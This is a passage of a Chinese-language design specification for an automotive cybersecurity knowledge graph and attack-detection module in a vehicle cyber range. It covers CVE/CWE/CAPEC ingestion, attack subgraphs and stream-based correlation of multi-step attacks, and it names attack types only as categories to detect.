href="#方案设计-11" class="headerlink" title="方案设计"></a>方案设计</h5><p>功能参数为，系统支持从互联网公开渠道获取智能汽车相关结构化和非结构化数据，自动抽取知识要素。基于CVSS3标准进行漏洞分数与漏洞危害等级关联映射。基于关键词识别漏洞描述，进行漏洞类型分类关联补全。从漏洞信息中抽取汽车漏洞实体与资产实体间关系。多维数据关联分析知识体系建立统一知识表示规范。联网自动进行汽车知识获取、抽取与更新。外网IP情报知识离线获取与更新，关联IP所属国家区域属性。基于抽取知识构建汽车网络安全知识图谱，支持知识更新。管理资产知识、漏洞知识、攻击知识，构建应用试验相关试验场景图谱。靶场试验场景图谱支持知识子图表示，快速联邦靶场间知识共享。基础攻击知识子图与复杂攻击知识子图注册到流计算引擎，支持复杂攻击检测。</p><p>性能参数为，资产知识对公开CPE覆盖率95%，漏洞知识对公开CVE覆盖率95%，攻击知识对公开CAPEC覆盖率95%，复杂攻击知识子图50种。</p><p>随着智能汽车技术的迅猛发展，网络安全已成为汽车行业关注的焦点。为了有效防御针对智能汽车的网络攻击，构建一个全面的网络安全知识图谱是至关重要的。本方案旨在通过自动化技术支持智能汽车相关数据的获取、漏洞知识的抽取、资产知识的管理、攻击知识的构建及其更新，从而为智能汽车提供坚实的网络安全知识支持。</p><p>数据获取与知识抽取</p><p>智能汽车相关数据获取：支持从互联网公开渠道获取结构化和非结构化智能汽车相关数据，包括CVE、CNNVD、CNVD等，支持JSON、XML等多种数据文件格式。</p><p>知识要素自动抽取：支持基于标准规范模板从大规模多源信息中自动抽取智能汽车漏洞知识、资产知识、攻击知识等要素。</p><p>漏洞分数与等级映射：支持基于CVSS3标准进行漏洞分数与漏洞危害等级的关联映射，并支持调整配置参数进行手动修正。</p><p>漏洞类型分类关联补全：支持基于关键词对漏洞描述进行识别，进而进行漏洞类型的分类关联补全。</p><p>漏洞与资产关系抽取：支持从漏洞信息中抽取出汽车漏洞实体与汽车资产实体之间的关系，以及基于攻击信息进行攻击与漏洞之间的关系抽取。</p><p>多维数据关联分析：支持基于多维数据关联分析知识体系建立统一的知识表示规范，用于关联攻击、漏洞与资产之间的关系。</p><p>知识自动获取与更新：支持联网情况下，自动进行汽车知识的获取、抽取与更新。</p><p>IP情报知识离线获取与更新：支持外网IP情报知识离线获取与更新，关联IP所属国家与区域等属性，支持分析与可视化展示。</p><p>知识图谱构建与管理</p><p>汽车网络安全知识图谱构建：支持基于抽取得到的资产知识、漏洞知识、攻击知识，构建汽车网络安全知识图谱，并支持知识的持续更新。</p><p>资产知识管理：支持资产知识的管理，包括操作系统、应用程序对应的产品名称、版本、关联厂商等信息。</p><p>漏洞知识管理：支持漏洞知识的管理，包括漏洞CVE编号、危害等级、漏洞类型、威胁类型、漏洞描述等信息。</p><p>汽车漏洞知识覆盖：支持汽车漏洞知识的全面覆盖，包括车端网联零部件相关的多种漏洞类型，资产包括TBOX、网关、车机等，数量大于2000个。</p><p>漏洞知识批量管理：支持对漏洞知识的批量新增、更新、删除，并支持基于属性的条件模糊查询。</p><p>漏洞知识统计：支持对漏洞知识按年份、CVSS分数、漏洞类型和威胁程度进行统计。</p><p>漏洞知识关联查询：支持漏洞知识关联受影响的操作系统、硬件、软件表示，并支持模糊查询。</p><p>弱点知识管理：支持弱点知识管理，包括CWE编号、描述、关系、适用平台等信息。</p><p>漏洞与弱点知识关联：支持漏洞知识与弱点知识基于弱点编号引用进行关联。</p><p>基础攻击知识管理：支持基础攻击知识管理，包括攻击编号、名称、可能性等信息，覆盖多种攻击分类。</p><p>基础攻击知识批量管理：支持对基础攻击知识的批量新增、更新、删除，并支持基于属性的条件模糊查询。</p><p>复杂攻击知识管理：支持复杂攻击知识管理，包括攻击步骤、利用的漏洞等信息。</p><p>汽车攻击场景复杂攻击知识管理：支持汽车攻击场景的复杂攻击知识管理，包括攻击类型、漏洞等信息。</p><p>复杂攻击知识批量管理：支持对复杂攻击知识的批量新增、更新、删除，并支持基于属性的条件模糊查询。</p><p>知识实体属性与关系表示：支持对资产、攻击、漏洞等知识实体的属性和相互关系的表示，并以结构化数据进行组织。</p><p>试验场景图谱构建：可基于网络安全知识图谱中的知识，结合靶场汽车应用试验关联的节点、资产、漏洞数据，构建应用试验相关的试验场景图谱，支撑攻击检测分析与扩展研究。</p><p>知识子图表示：靶场试验场景图谱支持知识子图的表示，快速实现联邦靶场之间的知识共享，支持在线同步。</p><p>基础攻击知识子图：表示包括基础攻击类型与安全事件的实例关系，基础攻击类型与漏洞的利用关系，漏洞与资产的存在关系。</p><p>攻击子图分类表示：包括探测型、破坏型、控制型、资源消耗型攻击子图表示。</p><p>探测型攻击子图内容：包含漏洞软件扫描、资源泄漏暴露等。</p><p>破坏型攻击子图内容：包含对象注入、协议篡改等。</p><p>攻击子图模糊查询与展示：支持基于攻击名称对某类型攻击子图进行模糊查询，并以图谱方式展示。</p><p>复杂攻击知识子图：由基础攻击知识子图的正确组合构成，表示基础攻击的时序关系和空间关系。</p><p>复杂攻击子图表示：包括APT攻击、僵尸网络、DDoS等，并进行可视化展示。</p><p>APT攻击子图表示：包含海莲花攻击、夜龙攻击等APT攻击子图表示。</p><p>智能汽车网络靶场攻击子图表示：支持车云业务入侵攻击等智能汽车网络靶场联网业务攻防演练场景攻击子图表示。</p><p>攻击子图注册与检测支持：支持将基础攻击子图与复杂攻击子图注册到流计算引擎，支撑进行复杂攻击检测与有效攻击检测。</p><p>资产知识覆盖率：资产知识对公开CPE的覆盖率应达到95%。</p><p>漏洞知识覆盖率：漏洞知识对公开CVE的覆盖率应达到95%。</p><p>攻击知识覆盖率：攻击知识对公开CAPEC的覆盖率应达到95%。</p><p>复杂攻击知识子图数量：复杂攻击知识子图应达到50种。</p><p>通过实施本方案，将构建一个全面、动态、可更新的智能汽车网络安全知识图谱。该图谱将大幅提高智能汽车网络安全防护的效率和准确性，为汽车网络安全研究提供坚实的数据支持，同时促进安全社区的知识共享和协作。</p><h5 id="方案介绍-1"><a href="#方案介绍-1" class="headerlink" title="方案介绍"></a>方案介绍</h5><p>基于实际试验任务环境资产、漏洞等信息，将场景知识图谱结合业务环境，具备从全局视角分析攻击，从宏观层面检测攻击的能力，从而避免大量的误报。利用知识图谱的知识抽取、知识融合、知识自主更新、知识推理等特点实现自动抽取网络安全知识、准确检测攻击还原攻击链的功能，功能中包括：基于标准规范模板从大规模多源的信息中，自动抽取知识要素；漏洞危害等级和漏洞分数是根据CVSS3标准进行对应,可自行修改相关参数调整关联;还可以进行漏洞类型的分类关联补全，这是根据关键词对漏洞描述进行识别的；可进行多维数据关联分析知识体系建立统一的知识表示规范处理，用于关联攻击、漏洞与资产之间的关系。在联网情况下，可以从互联网公开渠道获取结构化和非结构化智能汽车相关数据如CVE、CNNVD、CNVD，包括JSON、XML等数据文件格式，自动进行汽车知识获取、抽取与更新，同时进行离线获取和更新外网IP情报知识，关联IP的国家和区域等属性，以辅助分析并通过可视化方式展示。能够根据攻击信息进行漏洞以及攻击之间的关系抽取，也能够根据漏洞信息中抽取出汽车资产实体以及汽车漏洞实体之间的关系。CPE的覆盖率高达98.2%，CVE的覆盖率95.5%，CAPEC的覆盖率97.1%。还可以根据资产知识管理，包括操作系统、应用程序对应的产品名称、版本、关联厂商。</p><p>为了建立汽车靶场的知识图谱体系，提供针对汽车攻防场景相关的攻击资源库，其中包含与汽车攻防相关的漏洞资源库、弱点资源库、基础攻击资源库和复杂攻击资源库，资源库各类知识相关的资产主要分为硬件、软件和操作系统。漏洞分类包括硬件漏洞、软件漏洞和操作系统漏洞，基础攻击分类基于攻击方式主要包括探测类、攻击突破类、远程控制和窃取利用类等。可将抽取得到的资产知识、漏洞知识、攻击知识，构建汽车网络安全知识图谱，并支持知识更新，并且可以进行资产知识、漏洞知识管理，其中涵盖了包括漏洞描述、威胁类型、漏洞类型、漏洞CVE编号、危害等级。</p><p>汽车漏洞知识数量大于2000个，涵盖类型包括车端网联零部件相关的漏洞：</p><ol><li>内存溢出</li><li>目录穿越</li><li>整数溢出</li><li>解析错误</li><li>HTTP响应伪造</li><li>越权访问</li><li>ShellCode</li><li>HTTP请求伪造</li><li>SQL注入</li><li>代码执行</li><li>任意文件创建</li><li>缓存区过读</li><li>远程密码修改</li><li>暴力破解</li><li>远程溢出</li></ol><p>漏洞影响资产包括：</p><ol><li>远程控车</li><li>数字钥匙</li><li>中央处理单元</li><li>各类域控制器</li><li>TBOX</li><li>网关</li><li>车机以及</li><li>OTA</li><li>AVP</li></ol><p>可对漏洞知识的批量删除、更新、添加，并支持基于属性按条件模糊查询，并且将按威胁程度、漏洞类型、年份以及CVSS分数进行统计，漏洞知识还会关联受影响的操作系统、硬件、软件表示，支持条件查询、模糊查询。同时，可进行弱点资源库管理，每一条信息包括利用可能性、描述、关系、常见后果、适用平台、CWE编号、缓解措施等，同时漏洞知识基可以于弱点编号引用，也就是CWE编号进行关联。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/5c9c74bf7baa1e19064de1d1742f5794.png" alt="IMG_256"></p><p>在汽车攻防资源库中的知识支撑下，网络安全知识图谱中的知识结合靶场汽车应用试验关联的资产、漏洞、节点数据构建汽车场景的网络安全知识图谱，支撑攻击检测分析与扩展研究，知识图谱基于本体及本体关系的构建，支持表示实体属性及相互关系的表示，包括漏洞与资产型号的存在关系、基础攻击类型与漏洞的利用关系、基础攻击类型与攻击事件的从属关系。在同一个子图中以可视化形式中，虚拟化MPU、零部件、被测车辆、虚拟化MCU等4种类型的节点与知识图谱关联，关联的资产会包含应用程序版本、车型项目（年款）以及固件版本与中间件版本、操作系统的内核版本信息、车辆型号和车辆和整车品牌以及零部件的硬件平台等9类信息，漏洞的信息涵盖公开日期、漏洞的名称、危险级别、涉及的平台（如Windows或Linux）、漏洞类型、CVE编号等6类信息。以上信息均可在同一个子图中以可视化的形式展现。</p><p>基础攻击详细属性涵盖了相关脆弱性、缓解措施、先决条件、执行流程、威胁等级、技能要求、攻击名称、资源要求、后果、攻击可能性、攻击编号。基础攻击分类包括超危窃取利用类、高危远程控制、低危扫描探测类、中危攻击突破类。基础攻击页面上可以批量删除、更新、添加，并支持基于属性按条件模糊查询相关知识。同样的，也可对复杂攻击知识进行管理，包括各个攻击步骤的基础攻击编号、利用的漏洞、使用的工具、时空关系，可批量删除、更新、添加。</p><p>试验场景图谱中，知识子图涵盖了复杂攻击知识子图以及基础攻击知识子图，可以和分布式联邦靶场在线同步知识，快速在靶场与靶场之间实现知识共享，将子图注册到流计算引擎，可以利用该引擎进行有效攻击检测，也可利用流计算引擎进行复杂攻击检测。除此之外，还存在专门针对智能汽车网络的车载云服务的入侵攻击。除此之外，还存在一种专门针对智能汽车网络的入侵攻击，这被称为车云业务。这种攻击形式涉及联网业务汽车的攻防演练场景，特别是在智能汽车网络靶。</p><p>基础攻击知识子图，涵盖了资产以及漏洞之间的存在关系，漏洞以及基础攻击类型之间的利用关系，安全事件以及基础攻击类型之间的实例关系，这些类型涵盖了资源消耗型、探测型、控制型、破坏型攻击子图等。</p><p>其中探测型基础攻击子图包含：</p><ol><li>漏洞软件扫描</li><li>资源泄漏暴露</li><li>目录索引</li><li>未公开的网页检测</li><li>信息启发</li><li>TCP连接扫描</li></ol><p>破坏型基础攻击子图包含：</p><ol><li>对象注入</li><li>协议篡改</li><li>鱼叉式网络钓鱼</li><li>身份认证滥用</li><li>功能绕过</li><li>过度资源分配</li><li>跨站脚本（XSS）攻击</li><li>点击劫持</li><li>SQL盲注</li><li>代码注入</li><li>XML注入</li><li>TCP泛洪</li></ol><p>可以使用攻击名称进行模糊查询，查找特定类型的攻击子图。查询结果将以图谱形式展示所选攻击子图，呈现漏洞以及操作系统（或软件）的相互联系、漏洞以及基础攻击的相互联系、安全事件以及弱点相互联系、基础攻击以及安全事件之间相互联系。</p><p>复杂攻击知识子图是由按照一定关系基础攻击知识子图组合而成的，能够呈现基础攻击之间的时序关系，并且能够展现这些基础攻击在空间上的关联关系。简而言之，它是基础攻击知识的有序组合，用以表示攻击在时间和空间上的交互关系。其中包含蠕虫攻击、APT攻击、DDoS、僵尸网络等67种攻击子图表示，并以图谱的方式进行可视化展示。APT攻击类复杂攻击子图包含常见的NetTraveler APT、Luckycat APT、Heartbea APTt、Turla APT、夜龙 APT、Ke3chang APT、MiniDuke APT、海莲花 APT等APT攻击子图。</p><p>界面展示上以图标表示实体，连线代表关系，每一种实体采用不同颜色区分：红色代表复杂攻击、橙色代表基础攻击、黄色代表安全事件、紫色代表漏洞、玫红色代表弱点、蓝色代表资产。</p><p>知识图谱包括基础攻击子图和复杂攻击子图，在界面列表中在相关试验下展示，点击试验的图谱数量，展开或收起图谱详情，单击图谱在画布中进行内容切换。试验列表支持根据试验名称进行模糊检索。</p><p>基础攻击子图通过按攻击类型分类，展示了基础攻击与安全事件、漏洞利用、相关弱点之间的关系。而复杂攻击子图则是通过组合基础攻击子图构建而成，主要呈现了在汽车攻击场景中的复杂攻击知识，包括时空关系、攻击步骤以及漏洞利用等方面的信息。在画布中单击实体节点，弹窗显示对应实体详情。各实体的详情字段见下表。</p><table><thead><tr><th>实体</th><th>详情字段</th></tr></thead><tbody><tr><td>资产</td><td>资产IP</td></tr><tr><td></td><td>资产名称</td></tr><tr><td></td><td>资产类型</td></tr><tr><td></td><td>重要程度</td></tr><tr><td></td><td>资产描述</td></tr><tr><td>漏洞</td><td>漏洞编号</td></tr><tr><td></td><td>首发时间</td></tr><tr><td></td><td>危害等级</td></tr><tr><td></td><td>漏洞类型</td></tr><tr><td></td><td>威胁类型</td></tr><tr><td></td><td>漏洞描述</td></tr><tr><td>弱点</td><td>弱点编号</td></tr><tr><td></td><td>弱点名称</td></tr><tr><td></td><td>描述</td></tr><tr><td></td><td>关系</td></tr><tr><td></td><td>适用平台</td></tr><tr><td></td><td>常见后果</td></tr><tr><td></td><td>利用可能性</td></tr><tr><td></td><td>缓解措施</td></tr><tr><td>安全事件</td><td>安全事件ID</td></tr><tr><td></td><td>检测时间</td></tr><tr><td></td><td>源IP</td></tr><tr><td></td><td>源端口</td></tr><tr><td></td><td>目的IP</td></tr><tr><td></td><td>目的端口</td></tr><tr><td></td><td>源MAC</td></tr><tr><td></td><td>目的MAC</td></tr><tr><td></td><td>协议</td></tr><tr><td></td><td>描述</td></tr><tr><td>基础攻击</td><td>规则ID</td></tr><tr><td></td><td>攻击名称</td></tr><tr><td></td><td>攻击可能性</td></tr><tr><td></td><td>威胁等级</td></tr><tr><td></td><td>技能要求</td></tr><tr><td></td><td>资源要求</td></tr><tr><td></td><td>先决条件</td></tr><tr><td></td><td>执行流程</td></tr><tr><td></td><td>后果</td></tr><tr><td></td><td>缓解措施</td></tr><tr><td></td><td>相关脆弱性</td></tr><tr><td></td><td>创建时间</td></tr><tr><td></td><td>修改时间</td></tr><tr><td></td><td>攻击描述</td></tr><tr><td>复杂攻击</td><td>攻击名称</td></tr><tr><td></td><td>基础攻击步骤</td></tr><tr><td></td><td>基础攻击检测时间</td></tr><tr><td></td><td>基础攻击利用漏洞</td></tr><tr><td></td><td>基础攻击使用工具</td></tr><tr><td></td><td>复杂攻击空间关系</td></tr></tbody></table><h3 id="攻击检测研判模块"><a href="#攻击检测研判模块" class="headerlink" title="攻击检测研判模块"></a>攻击检测研判模块</h3><h4 id="功能实施方案-25"><a href="#功能实施方案-25" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>系统支持基础攻击去重功能，以确保在分析和检测中避免冗余和不必要的信息。去重策略是基于基础攻击类型知识体系中不同攻击类型的特征，提供了二元组、三元组和四元组等多种去重策略，以满足用户对于信息去重的不同需求。对于二元组去重，系统将基于攻击名称和攻击可能性等两个关键特征进行去重，以确保相同攻击类型的不同实例不会重复显示。这帮助用户在结果展示和分析中获得更加清晰和简洁的信息。在三元组去重策略中，系统将考虑更多的攻击特征，例如攻击名称、攻击可能性和攻击威胁等，以确保更细致的去重过程。这有助于用户更全面地了解攻击实例之间的异同，提高信息的可理解性。对于四元组去重，系统将综合攻击名称、攻击可能性、攻击威胁和攻击等级等多个关键特征，以提供更为精确和详细的信息去重，为用户提供更深入的分析和决策支持。这些去重策略的实施将确保系统在呈现基础攻击信息时，减少重复性的内容，使用户能够更有效地处理和理解攻击数据。</li><li>系统支持对基础攻击数据进行可链标记，为后续的复杂攻击关联分析提供了有力的支持。可链标记的设计旨在建立攻击数据之间的关联关系，使用户能够更全面、准确地理解攻击事件的演变和连贯性。通过可链标记，用户可以标识和关联与特定基础攻击相关的其他攻击实例。这有助于建立攻击事件的时序关系和空间关系，为用户提供更深入的攻击路径分析和威胁溯源能力。这种链式标记机制使得系统能够更全面地展示攻击事件的整体情景，提高用户对攻击事件演变的洞察力。在进行复杂攻击关联分析时，这些可链标记的基础攻击数据将为用户提供清晰而有序的信息框架，使用户能够更容易地识别攻击链条上的关键事件和节点。这有助于系统更准确地检测和应对威胁，提高整体的安全性。致力于为用户提供强大而灵活的攻击分析工具，可链标记功能是系统中为用户提供更全面、高效分析手段的重要一环。</li><li>系统支持基于试验的资产漏洞探测结果进行有效攻击检测，以确保系统在试验过程中能够快速而精准地识别和响应潜在的威胁。通过对资产漏洞探测结果的分析，能够全面了解资产、网络的脆弱性信息，并针对性地以资产脆弱性为依据，实时捕获安全事件，并根据漏洞情况进行有效的攻击检测。系统将从资产漏洞探测结果中提取关键信息，包括漏洞名称、CVE编号、危害级别等，与当前的安全事件数据库进行比对。通过实时匹配和分析，系统能够识别与已知攻击模式相关的漏洞安全事件，并采取相应的响应措施，从而提高整个系统的安全性。基于试验的资产漏洞探测结果进行攻击检测，有助于系统更及时地发现并阻止潜在的威胁。这种集成的安全性能使得系统在试验过程中能够不仅关注漏洞的存在，还能够深入分析可能导致的安全事件，从而更全面地提升系统的安全防护水平。</li><li>系统支持基于“资产-漏洞-攻击”多维关联关系进行有效的基础攻击检测，这一关联关系的建立有助于系统更全面、深入地理解和分析潜在的威胁情境。通过整合资产、漏洞和攻击的多维信息，系统能够更准确地检测潜在的基础攻击。在这个多维关联关系中，资产是关键的节点，涵盖了整车品牌、车型、车辆、车型项目、零部件的硬件平台、操作系统内核版本信息、固件版本、中间件版本、应用程序版本等多个维度的信息。漏洞信息包括漏洞名称、CVE编号、涉及平台、危害级别、漏洞类型、公开日期等。攻击信息包括攻击编号、攻击名称、攻击可能性、威胁等级、技能要求、资源要求、先决条件、执行流程、后果、缓解措施、相关脆弱性等。通过建立这些多维关联关系，系统能够在攻击检测过程中更好地理解资产的漏洞状况，进而推断可能的基础攻击路径。这种综合的分析有助于系统在攻击发生前识别潜在的威胁，提高整个系统的安全性。</li><li>系统支持在试验中将安全事件与产生的基础攻击数据以及试验中发现的脆弱性进行关联分析，以生成有效攻击并过滤无效攻击。这一功能的目标在于提供系统更智能、更精准的攻击检测和过滤机制，从而确保系统能够专注于最具威胁性的攻击事件。在试验过程中，系统会融合产生的基础攻击数据与试验中的脆弱性信息，建立二者之间的关联关系。这样，系统能够更全面地理解试验环境的安全状态，识别潜在的攻击路径和威胁来源。通过深度关联分析，能够生成有效的攻击事件，有针对性地提高系统的安全防护水平。同时，系统还支持过滤无效攻击，确保用户能够更有效地处理安全事件。通过智能的过滤机制，系统可以识别那些在试验环境中并不具备实际威胁的攻击，避免不必要的干扰和误报，提高整个系统的工作效率。将不断优化系统的关联分析和过滤机制，以确保系统在试验过程中能够更精准、更高效地识别和应对各类安全事件。</li><li>系统支持基于攻击突破类、远程控制与窃取利用类攻击类别进行有效攻击检测验证，能够生成有效攻击数据，旨在确保系统对这些关键攻击类型有着高效而准确的识别与响应机制。通过专注于这些攻击类别的检测，能够更好地保障系统在试验中充分检验其安全性。在攻击突破类中，系统能够检测和验证一系列攻击手段，包括但不限于对象注入、协议篡改、身份认证滥用、功能绕过、过度资源分配、跨站脚本（XSS）攻击、点击劫持、SQL盲注、代码注入、XML注入等。这有助于系统及时识别可能导致系统崩溃或数据泄漏的攻击，并生成有效的攻击数据用于进一步分析和响应。远程控制类攻击是智能汽车系统面临的严重威胁之一，系统能够有效检测这类攻击，包括但不限于远程控制车辆、远程窃取车辆信息等威胁。通过强化远程控制攻击的检测和验证，能够提升系统的抵御能力，确保车辆安全。窃取利用类攻击包含了各种可能导致敏感信息泄露的手段，例如窃取车辆内部数据、远程监视车辆行驶轨迹等。系统能够有效检测这类攻击，通过生成有效攻击数据，帮助用户在试验过程中全面了解系统的安全性能。</li><li>系统支持对生成的有效基础攻击进行深入分析，通过攻击数据中的源IP、目标IP、端口、VLAN等关键信息，实现对攻击数据来源队伍（或选手）和攻击目标的准确识别。这一功能的目的在于帮助用户更全面地了解试验中的攻击情境，以及对攻击者和被攻击目标的追踪和识别。通过对攻击数据中的源IP进行溯源，系统能够精确定位攻击的来源队伍或选手。这有助于建立攻击者档案，为安全团队提供有力的侦查线索，使其能够采取相应措施来应对潜在威胁。同时，对攻击目标的分析也是系统的一项重要功能。通过识别攻击数据中的目标IP、端口和VLAN等信息，系统可以明确攻击的目标是何种资产或系统，进而帮助用户优化安全策略，加强对潜在目标的保护。</li><li>系统支持将生成的基础攻击数据无缝地发送并存储到大数据平台，以满足用户对攻击数据的集中管理和深度分析的需求。这一功能的实现旨在为用户提供更灵活、高效的大数据处理和分析解决方案。通过将基础攻击数据发送至大数据平台，用户可以充分利用大数据技术的优势，实现对海量攻击数据的高效存储、检索和分析。这有助于用户建立全面的攻击事件数据库，支持后续的趋势分析、模式识别和安全事件溯源。大数据平台的使用还能够加速攻击数据的处理速度，使用户能够更迅速地响应和处理攻击事件。同时，大数据平台的强大计算和分析能力也为用户提供了更丰富的数据挖掘和可视化展示的可能性，有助于更深入地了解攻击者行为模式和系统漏洞。</li><li>系统支持接收融合后的安全事件流数据，并将这些数据进行内存缓存，以用于攻击检测匹配分析。这一功能的实现旨在提供高效、实时的攻击检测与分析服务，帮助用户更迅速地发现和应对潜在的安全威胁。内存缓存的采用使得系统能够快速访问和查询最新的安全事件数据，实现实时的攻击检测。通过在内存中存储融合后的安全事件流数据，能够迅速匹配攻击特征，提高攻击检测的速度和准确性，确保系统在第一时间捕捉到潜在威胁。这样的设计还能有效降低系统的响应时间，确保安全事件的实时性。当新的安全事件流数据到达时，系统可以快速进行匹配分析，立即发出警报或采取相应的响应措施，有助于降低潜在威胁对系统的影响。</li><li>系统支持接收试验攻击子图，并将其注册到流计算引擎中，同时提供动态更新的功能。这一强大的功能组合旨在实现对试验攻击情境的实时监测和分析，为用户提供全面的攻击检测与防范服务。通过接收试验攻击子图并注册到流计算引擎中，实现了对试验中攻击数据的实时流处理。这使系统能够立即捕获试验过程中的攻击事件，无论是基础攻击还是复杂攻击，以便及时做出响应。同时，系统支持对试验攻击子图进行动态更新，确保安全策略的实时适应性。随着试验的进行，新的攻击情境可能不断浮现，系统能够及时获知并动态更新流计算引擎中的攻击子图，以保持对新兴威胁的敏感性。</li><li>系统支持接收试验停止指令，并在收到该指令时执行相应操作，包括清除与试验相关的子图信息。这一功能的实现旨在提供试验管理的全面性，确保在试验结束后能够有效、安全地清理相关数据，维护系统的整体健康。一旦接收到试验停止指令，系统将迅速响应并执行清除操作。这包括清除与试验相关的攻击子图、拓扑结构信息、资产数据等子图信息，以确保试验产生的数据不会对后续操作产生影响。清除试验相关子图信息的过程是高效而可控的，确保系统在试验结束后能够快速、彻底地释放相关资源。这有助于维护系统的高性能和稳定性，同时保护试验数据的隐私和安全。</li><li>系统支持利用攻击之间的时间与空间关系特征，对安全事件流数据进行关联分析，以全面洞察攻击活动的模式和趋势。这一功能的实现旨在提供更深入的攻击检测与分析服务，使用户能够更全面、准确地了解系统中潜在的威胁行为。通过对安全事件流数据进行时间关联分析，系统能够识别攻击活动的时间模式，包括攻击发生的时间段、频率以及可能的周期性。这有助于系统在早期发现潜在的攻击活动，提高对未知威胁的感知能力。同时，系统也能够利用攻击之间的空间关系特征进行关联分析。这包括攻击发生的地理位置、涉及的网络节点以及攻击路径等信息。通过综合考虑时间与空间关系，系统能够更准确地识别攻击者的行为模式，增强对复杂攻击的检测与应对能力。</li><li>系统支持基于流计算分析技术和滑动时间窗口，实时进行多步攻击序列分析，以提供对复杂攻击行为的实时监测和全面分析。这一先进的功能组合旨在使用户能够及时发现并应对多阶段攻击，加强对威胁的实时感知。通过采用流计算分析技术，系统能够实时处理和分析安全事件流数据，迅速捕捉攻击序列中的多步骤行为。这有助于系统在攻击进行的早期阶段就识别威胁，从而提高系统的攻击检测和响应速度。滑动时间窗口的应用使系统能够对一定时间范围内的数据进行连续监测和分析。这有助于系统更全面地理解攻击行为的演变过程，发现可能的攻击序列模式，从而加强对攻击者行为的深入洞察。</li><li>系统支持基于可链基础攻击数据与流计算生成的多步攻击序列数据，进行关联组合，生成多节点、跨多域的复杂攻击。这一强大的功能集成旨在通过综合多源数据，提供对真实复杂攻击场景的全面分析和检测，增强对高级威胁的应对能力。系统能够从可链基础攻击数据中提取攻击的时序关系和相关特征，同时通过流计算生成的多步攻击序列数据，对攻击行为进行更深入的实时分析。通过关联组合这两类数据，系统能够在攻击行为中识别并构建多节点、跨多域的复杂攻击图谱。这种关联组合的方法不仅仅提供了攻击活动的全局视图，还能够揭示攻击者可能的策略和意图。这有助于系统在面对更为复杂的威胁时，更准确地判断攻击的威胁程度，及时采取相应的防御措施。</li><li>系统具备先进的检测技术，支持多步复杂攻击事件的实时监测，特别是针对APT攻击、DDoS攻击等高级威胁类型。这一功能集成旨在提供对智能汽车网络中复杂攻击的全方位分析，帮助用户及时发现并应对潜在的高级威胁。对于APT攻击，系统能够识别并分析与其关联的多步攻击序列，捕捉攻击者渗透、横向移动、信息窃取等行为，从而提供对高级威胁的精准检测和防范。在DDoS攻击方面，系统能够实时监测网络流量，识别异常流量模式，通过多步复杂攻击事件检测，捕获攻击者可能采用的各种手段，包括分布式拒绝服务攻击、协议洪水攻击等，以保障网络的正常运行。</li><li>系统具备先进的复杂攻击检测功能，特别针对智能汽车安全攻击场景进行优化。系统采用数据采集分析、特征分析、文件分析、关联分析、综合分析等分析技术，能够检测并报告多种攻击类型，包括但不限于APT攻击、DDoS攻击等。检测结果详细展示了攻击的类型、源头以及被攻击的靶标信息。在靶标方面，系统支持多种类型的汽车组件和子系统，通过虚拟仿真、实物仿真、半实物仿真技术实现对于靶场的仿真构建，涵盖OTA靶标、TBOX靶标、网关靶标、车身域控制器靶标、底盘域控制器靶标、动力域控制器靶标等。这有助于用户全面了解攻击的目标，从而更好地采取针对性的安全措施。</li><li>系统支持灵活的阈值类攻击检测功能，允许用户根据实际需求自定义检测参数，包括检测间隔、阈值等。这使得用户能够精确地配置系统以侦测各类威胁，其中包括但不限于webshell远程控制、暴力破解、扫描探测、web站点漏洞扫描等类型的攻击。通过设定检测间隔，用户可以调整系统的敏感度，灵活适应不同的攻击威胁场景。同时，用户可以设置阈值，当系统监测到攻击行为频率达到或超过设定阈值时，系统将发出警报或采取预设的安全措施。</li><li>系统支持基于试验成果推导生成复杂攻击，通过成果信息的关联分析，获得复杂攻击步骤并生成相应的复杂攻击。这一功能极大地提高了系统的智能化和自适应性，使系统能够更加灵活地应对不断演进的网络威胁。系统通过对试验成果信息进行深入分析，关联各个元素之间的关系，识别潜在的复杂攻击路径。基于这些关联分析的成果，系统能够自动推导出相应的复杂攻击步骤，形成完整的复杂攻击链。这有助于用户更全面地了解可能的威胁形式，提前做好安全准备和应对策略。</li><li>支持对于复杂攻击的有效性判断，攻击检测研判模块具备对复杂攻击的有效性进行判断的能力，能够关联有效的基础攻击数据，准确识别有效的复杂攻击。这种功能确保了模块能够准确判断出攻击的有效性，提高了网络靶场的防御策略的准确性。通过对复杂攻击的有效性进行判断，用户可以更好地了解攻击的本质和特点，为进一步的安全防护提供有力支持。同时，该模块还能够将有效的复杂攻击数据进行关联和识别，提高了对攻击数据的管理和利用效率。这种功能在网络靶场的安全防护中具有重要意义，能够有效地提高网络靶场的防御能力和安全性。</li><li>系统提供了完善的数据导出功能，支持将生成的复杂攻击数据无缝地发送并存储到大数据平台。这一功能不仅有助于用户对安全事件进行长期的存储和分析，还为后续的威胁情报研究、趋势分析以及安全策略优化提供了强大的支持。通过系统的数据导出功能，用户可以灵活地选择存储目标，将复杂攻击数据导出到大数据平台以供进一步挖掘和分析。这种无缝集成的能力使得用户能够更全面地理解复杂攻击的本质、特征和潜在影响，为制定更有效的安全策略提供了充足的信息基础。</li><li>系统全面支持基于网络靶场的多试验并行处理与分析，为用户提供了卓越的灵活性和效率。通过多试验并行处理，用户能够同时进行多项试验，充分发挥系统性能，提高试验效率和实验产出。系统支持用户在网络靶场中同时启动和管理多个试验任务，确保各试验相互独立、高效运行。这一功能旨在满足用户对于同时进行多个实验的需求，从而更全面、深入地了解系统的安全性能和应对多样化攻击的能力。多试验并行处理与分析的特点在于系统的并发性和高效性，用户可以在不同的实验场景中针对不同的攻击类型、漏洞场景等进行独立测试和分析。这使得用户能够更全面、深入地了解系统的安全性能和应对多样化攻击的能力。</li><li>系统提供了全面的基础攻击数据展示功能，以帮助用户清晰了解网络安全状况。在攻击数据展示中，系统将详细呈现攻击类型、源IP地址、目的IP地址、源端口、目的端口、攻击描述等关键信息，以便用户能够迅速、准确地分析和理解每一次攻击事件。攻击类型的展示包括各类攻击，如扫描探测、远程控制、窃取利用等，使用户能够对网络受到的不同类型攻击有清晰的分类认识。同时，源IP地址和目的IP地址展示了攻击行为的起源和目标，有助于用户追溯攻击来源和受影响的网络节点。端口信息展示涵盖了源端口和目的端口，为用户提供了攻击行为在网络中的具体路径和目标。攻击描述则提供了攻击的详细信息，帮助用户全面理解攻击的本质和潜在风险。</li><li>系统支持基于去重后的基础攻击数据进行索引，以便用户能够方便地找到与其相关的原始事件。通过去重操作，系统能够减